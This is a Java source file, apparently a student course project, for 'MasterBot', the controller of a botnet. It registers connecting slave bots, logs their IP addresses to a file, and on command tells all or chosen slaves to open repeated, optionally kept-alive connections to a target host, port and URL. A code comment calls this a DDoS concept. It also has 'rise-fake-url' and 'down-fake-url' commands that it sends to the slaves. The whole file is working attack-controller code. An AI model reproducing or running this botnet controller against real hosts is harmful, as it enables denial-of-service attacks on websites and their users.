import java.net.*;
import java.util.*;
import java.io.*;
import java.text.SimpleDateFormat;
import java.io.BufferedWriter.*;



// MasterBot Class
public class MasterBot extends Thread {
	
	// Parameters sent to Slave while using the connect and disconnect
	static String slaveAddress, masterAddress, masterPort, connectSlave;
	
	// Project Second Part declaration begins.
	
	// The string declaration for URL.
	static String url="";
	
	// For the keep Alive constraint, Project 2nd Part.	
	static boolean keepAlive = false;
	
	// Project Second Part declaration ends.
	
	// An array list of all the Socket Object connections that are made.
	static ArrayList<Socket> listofSlave = new ArrayList<>();
	
	// An object to Slave Bot to communicate to it. THis is the connectSlave bw Master and Slave.
	static SlaveBot slave = new SlaveBot();
	
	// A Server Socket Object.
	private ServerSocket masterSocket;

	public static void main(String[] args) throws IOException { // Program Execution Starts here.


		int portNumber = 1; // Initializing to run the thread while creating an object.. this will be set by the user.
				
		if (args[0].equals("-p"))
		{
			portNumber = Integer.parseInt(args[1]);
			System.out.print("> ");
		}
		
		else
		{
			System.out.println("Please enter the inputs in this format for running the Master");
			System.out.println("java MasterBot -p portNumber");
			System.out.println("Exiting the MasterBot Program");
			System.exit(-1);
		}
		
		if (portNumber != 0) {
			try {
				Thread t = new MasterBot(portNumber); // Based on port argument, a new MasterBot thread is created
				t.start(); // Thread is created successfully and first the run method is called and then start Method.
						   // Follows thread execution.

			} catch (IOException e) {
				// Commented for Project Purpose - No Extra Prints
				// System.out.println("Exception occurred, exitting the main in MasterBot");
				System.exit(-1);
			}
		}
		try {
			String commandLine;
			
			// Create a bufferedReader instance that reads.. BufferReader is passed with an object of input Stream..
			BufferedReader console = new BufferedReader(new InputStreamReader(System.in)); 

			// This Buffer reader is used to save the contents of the Slave in a file and later used for manipulations.
			BufferedReader slaveFile = null;

			do {

				commandLine = console.readLine();
				
				if (commandLine.equals(""))
					System.out.print("> ");
				
				if (commandLine.equals("exit"))
				{
					System.out.println("Exitting the Master.");
					System.exit(0);
				}

				// List Command Implementation Starts
				if (commandLine.endsWith("list")) {
					String para;

					slaveFile = new BufferedReader(new FileReader("slaveRecord.txt")); 

					// where it holds the Slave's IP and other details in a formatted way.
					if ((para = slaveFile.readLine()) == null) {
						// To Remove unwanted printing as per project specs.
					//	System.out.println("List is Empty");
						System.out.print("> ");
					} 
					else {
						slaveFile = new BufferedReader(new FileReader("slaveRecord.txt"));
						while ((para = slaveFile.readLine()) != null) {
							System.out.println(para);
						}
						System.out.print("> ");
					}
				}
				// List Command Implementation ends
				
				// connect command Implementation Starts
				if (commandLine.startsWith("connect ")) {
					String[] arrayOfString = commandLine.split("\\s+");
					//	System.out.println("Inside connect in Master");
					
					if (arrayOfString.length == 4) {
						slaveAddress = arrayOfString[1];						
						masterAddress = arrayOfString[2];					    
						masterPort = arrayOfString[3];						
						connectSlave = "1";// if no arg is specified, no. of connections to each slave is 1
											// else assume watever the user has passed.
					}
					
					else if(arrayOfString.length == 5) {
						slaveAddress = arrayOfString[1];
						masterAddress = arrayOfString[2];
						masterPort = arrayOfString[3];
					
						if(arrayOfString[4].contains("keepAlive") || arrayOfString[4].contains("keepalive"))
						{
							connectSlave = "1";
							keepAlive = true;
							url = "";
						}
						else if(arrayOfString[4].contains("url"))
						{
							connectSlave = "1";
							keepAlive = false;
							url = arrayOfString[4];
							//System.out.println(url);
						}
						else
						{
							connectSlave = arrayOfString[4];
							keepAlive = false;
							url = "";
						}

					}
					else if(arrayOfString.length == 6)
					{
						slaveAddress = arrayOfString[1];
						masterAddress = arrayOfString[2];
						masterPort = arrayOfString[3];
						if((arrayOfString[4].contains("keepAlive") || arrayOfString[4].contains("keepalive")) && (arrayOfString[5].contains("url")))
							{
								keepAlive = true;
								url = arrayOfString[5];
								connectSlave = "1";
							}
						else if(arrayOfString[5].contains("keepAlive") || arrayOfString[5].contains("keepalive"))
							{
								keepAlive = true;
								connectSlave = arrayOfString[4];
								url = ""; 
							}
						else if(arrayOfString[5].contains("url"))
							{
								keepAlive = false;
								url = arrayOfString[5];
								connectSlave = arrayOfString[4];
							}
					}
					else if(arrayOfString.length == 7)
					{
						
						slaveAddress = arrayOfString[1];
						masterAddress = arrayOfString[2];
						masterPort = arrayOfString[3];
						keepAlive = true;
						url = arrayOfString[6];
						connectSlave = arrayOfString[4];
						
					}

				if (slaveAddress.equalsIgnoreCase("all")) // Using ignore case to eliminate if there are any case mismatch.
					{
						for (int k = 0; k < listofSlave.size(); k++) {
							// Here connectSlave means connectSlave to every slave bot.
							
							
							// If connectSlave argument is passed as a part of the command, we need
							// to make so many connections to the slave. It refers to DDOS Concept.
							for (int j = 0; j < Integer.parseInt(connectSlave); j++) {
								slave.createSocket(listofSlave.get(k), Integer.parseInt(masterPort), masterAddress,	Integer.parseInt(connectSlave), keepAlive, url);
							}

						}
						System.out.print("> ");

					}
				else {
						String line;
						// System.out.println("Inside the else part, slave address is not all");
						
						for (int j = 0; j < listofSlave.size(); j++) {
							line = "/" + slaveAddress;
							// System.out.println("slaveAddress inside the loop is: "+ line);
							/* Here we check to see if the slave is up/not and
							   then create WS to them based on the no. of
							   connections.
							   
							// Commented isSlaveInList part as per Project 2 localhost spec.
							*/
							//boolean isSlaveInList = line.equalsIgnoreCase(listofSlave.get(j).getRemoteSocketAddress().toString());
							// System.out.println("Remote address of the slave: "+ listofSlave.get(j).getRemoteSocketAddress().toString());
							// System.out.println("Is slaveAddress is my list of slaves: " + isSlaveInList);
							
							boolean isSlaveInList = true;
							if (isSlaveInList) {

								for (int k = 0; k < Integer.parseInt(connectSlave); k++) {
									slave.createSocket(listofSlave.get(j), Integer.parseInt(masterPort), masterAddress, Integer.parseInt(connectSlave), keepAlive, url);
								}
							}
						}
						System.out.print("> ");
					}
				}

				// connect command Implementation ends
				
				
				// disconnect command Implementation Starts				
				if (commandLine.contains("disconnect ")) {
					String[] arrayOfString = commandLine.split("\\s+");
					//System.out.println("inside Disconnect");
					
					if (arrayOfString.length == 3) {
						slaveAddress = arrayOfString[1];
						masterAddress = arrayOfString[2];
						masterPort = "9999";
					} 
					else {
						slaveAddress = arrayOfString[1];
						masterAddress = arrayOfString[2];
						masterPort = arrayOfString[3];
					}
					
					//System.out.println(arrayOfString[1] + "\t" + arrayOfString[2] + "\t" + arrayOfString[3]);
					
					/*if (masterAddress.startsWith("www.") || masterAddress.endsWith("com"))
					{
						masterAddress = "80";
					}*/
					
					slave.disconnect(Integer.parseInt(masterPort), masterAddress);
					System.out.print("> ");
				}
				// disconnect command Implementation ends
				
				if (commandLine.startsWith("rise-fake-url") || commandLine.startsWith("down-fake-url")){
					
					String[] arrayOfString = commandLine.split("\\s+");
					
					if(arrayOfString.length == 3)
					{
						//System.out.println("HI");
						
						String mode = arrayOfString[0];
						int portNbr = Integer.parseInt(arrayOfString[1]);
						String URL = arrayOfString[2];
						//System.out.println(portNbr);
						//int interupt;
						
						for (int k = 0; k < listofSlave.size(); k++) {	
							
							if(mode.equals("rise-fake-url"))
							{
								System.out.println("Running Rise Fake URL Command, Please view the Web Page.");
								slave.createSocket(listofSlave.get(k), mode, portNbr, URL, 0);
								//System.out.print("> ");
							}
							else
							{
								System.out.println("Running Down Fake URL Command, Please view the Web Page.");
								slave.createSocket(listofSlave.get(k), mode, portNbr, URL, 1);
								//System.out.print("> ");
							}
						}
					}
					
					else
					{
						System.out.println("Incorrect Syntax for " + arrayOfString[0]);
						System.out.println("Please Enter the syntax in the below format");
						System.out.println(arrayOfString[0] + " portNumber " + "url");
					}
					
					System.out.print("> ");
					
				}
				
			} while (true);
			// End While
		} // End try

		catch (Exception e) {
			// Commented for Project Purpose - No Extra Prints
			// System.out.println("Exception occurred, exitting the do-while loop in the main in MasterBot");
			System.exit(-1);
		}
	}

	public MasterBot(int port) throws IOException {
		masterSocket = new ServerSocket(port); // Create a server socket for our MasterBot
	}

	// The following run method will run when the thread.start is called..
	public void run() {
		try {
			//System.out.println("Inside Run Thread");

			int listCount = 0;
			BufferedWriter output = null;
			String text = "";
			File file = new File("slaveRecord.txt"); // Creating a file named slaveRecord to hold all the slave details in that file.
			output = new BufferedWriter(new FileWriter(file));
			text = "SlaveHostName" + "\t" + "IPAddress" + "\t\t"
					+ "SourcePortNumber" + "\t" + "RegistrationDate";
			output.write(text); // The Buffered Writer object will write the text to the SlaveRecord file.
			output.newLine(); // To go to the new line.
			
			do {
				listCount++;   // Count of Slaves..
				String tester = "";

				Socket master = new Socket(); // Creation of an object Socket
				master = masterSocket.accept();// accepts the Connection from the Slave
				listofSlave.add(master);
				text = "Slave:" + listCount + "\t" +"\t";
				output.write(text);
				
				tester = master.getRemoteSocketAddress() + "\t";
				

				text = tester.substring(1, tester.length()) + "\t"; // The method getRemoteSocketAddress gets the ip address of the Slave.
				output.write(text);

				text = masterSocket.getLocalPort() + "\t\t"; // The method getLocalPort gets the local port number of the slave.
				output.write(text);

				text = "\t" + new SimpleDateFormat("yyyy-MM-dd").format(Calendar.getInstance().getTime()); // To Print the date in the specified format.
				output.write(text);
				output.newLine();

				output.flush();
			}
			while (true);

		} 
		catch (IOException e) {
			// Commented for Project Purpose - No Extra Prints
			// System.out.println("Exception Occurred, exiting the run method from the thread in MasterBot");
			System.exit(-1);
		} 
		finally {
			try {
				masterSocket.close();
			} 
			catch (IOException e) {
				// Commented for Project Purpose - No Extra Prints
				// System.out.println("Exception Occurred, unable to close the master Socket in the thread in MasterBot");
				System.exit(-1);
			}
		}

		try {
			String listData;
			BufferedReader reader = null;
			reader = new BufferedReader(new FileReader("slaveRecord.txt"));

			while ((listData = reader.readLine()) != null) {
				System.out.println(listData);
			}
		} 
		catch (IOException e) {
			// Commented for Project Purpose - No Extra Prints
			// System.out.println("Exception Occurred, exitting the run method.error while listing the file in MasterBot");
			System.exit(-1);
		}
	}
}